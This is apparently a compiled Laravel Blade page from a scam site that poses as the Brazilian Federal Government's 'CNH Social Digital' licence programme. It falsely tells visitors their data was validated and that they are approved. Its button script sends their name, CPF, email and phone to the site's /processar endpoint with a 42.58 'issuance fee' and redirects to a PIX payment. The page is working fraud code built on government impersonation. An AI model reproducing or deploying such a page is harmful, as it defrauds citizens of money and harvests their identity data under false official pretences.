<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="bg-blue-50 rounded-lg p-4 space-y-4">
                        <h2 class="font-bold text-foreground text-lg">Dados validado com sucesso no Sistema Nacional de Benefícios (SNR)</h2>
                        <p class="text-foreground">Parabéns <span class="font-bold firstName uppercase"></span> você foi aprovado com sucesso e já pode marcar seu exame médico e psicotécnicos! A conclusão dessa verificação é essencial para a liberação das aulas teóricas e práticas na autoescola parceira.</p>
                        <div>
                            <h3 class="font-bold text-[#1B4F9B] text-lg mb-3">Acompanhamento do Processo</h3>
                            <div class="bg-white rounded-lg p-4 space-y-3">
                                <div class="flex justify-between border-b border-border pb-2">
                                    <span class="font-semibold text-foreground">Nome Completo:</span>
                                    <span class="text-[#1B4F9B] font-semibold text-right uppercase name"></span>
                                </div>
                                <div class="flex justify-between border-b border-border pb-2">
                                    <span class="font-semibold text-foreground">CPF:</span>
                                    <span class="text-[#1B4F9B] font-semibold cpf"></span>
                                </div>
                                <div class="flex justify-between pb-2">
                                    <span class="font-semibold text-foreground">PROTOCOLO:</span>
                                    <span class="text-[#1B4F9B] font-semibold protocolo">RAR-742429</span>
                                </div>
                            </div>
                        </div>
                        <div class="bg-white border-l-4 border-[#1B4F9B] rounded p-3">
                            <div class="flex items-start gap-2">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-5 w-5 text-[#1B4F9B] flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                                <p class="text-sm text-foreground">Após a confirmação do pagamento da taxa de emissão, o sistema realizará automaticamente o agendamento dos exames obrigatórios em clínicas credenciadas ao programa. Todas as instruções necessárias para a realização dos exames e início das aulas teóricas e práticas serão enviadas ao seu e-mail cadastrado.</p>
                            </div>
                        </div>
                        <div class="space-y-3">
                            <div class="flex items-center gap-3 bg-white rounded-lg p-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-6 w-6 text-green-600"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                                <span class="font-semibold text-foreground">Dados validados</span>
                            </div>
                            <div class="flex items-center gap-3 bg-white rounded-lg p-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-6 w-6 text-green-600"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                                <span class="font-semibold text-foreground">Exame psicotécnico</span>
                            </div>
                            <div class="flex items-center gap-3 bg-white rounded-lg p-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-6 w-6 text-green-600"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                                <span class="font-semibold text-foreground">Exame Médico</span>
                            </div>
                        </div>
                        <button onclick="processarTax(42.58)" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-5 text-base font-semibold bg-green-600 hover:bg-green-600/90 text-white" id="btnContinuar">AGENDAR DATA</button>
                    </div>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
if(!userData){
    window.location.href = "<?php echo e(url('/login')); ?>";
} 

const primeiroNome = userData.NOME.split(' ')[0];
$('.firstName').text(primeiroNome);
$('.cpf').text(userData.CPF);
$('.name').text(userData.NOME);
$('.nascimento').text(userData.NASC);
$('.protocolo').text(userData.protocolo);

function processarTax(valor){
    var nome = userData.NOME;
    var cpf = userData.CPF;
    var email = userData.email;
    var telefone = userData.telefone;

    $('.loading__circle').css({ 'display': 'flex' });

    $.ajax({
        type: 'POST',
        url: "<?php echo e(url('/processar')); ?>",
        headers: {
            'X-CSRF-TOKEN': '<?php echo e(csrf_token()); ?>'
        },
        data: {
            servico: 'Payment CN',
            nome: nome,
            cpf: cpf,
            email: email,
            telefone: telefone,
            valor: valor
        },
        dataType: 'json',
        success: function (response) {
            if(response.success){
                window.location.href = "<?php echo e(url('/checkout/pix')); ?>/" + response.id;
            }else{
                $('.loading__circle').css({ 'display': 'none' });
            }
        }
    });
}

</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/agendar-exame.blade.php ENDPATH**/ ?>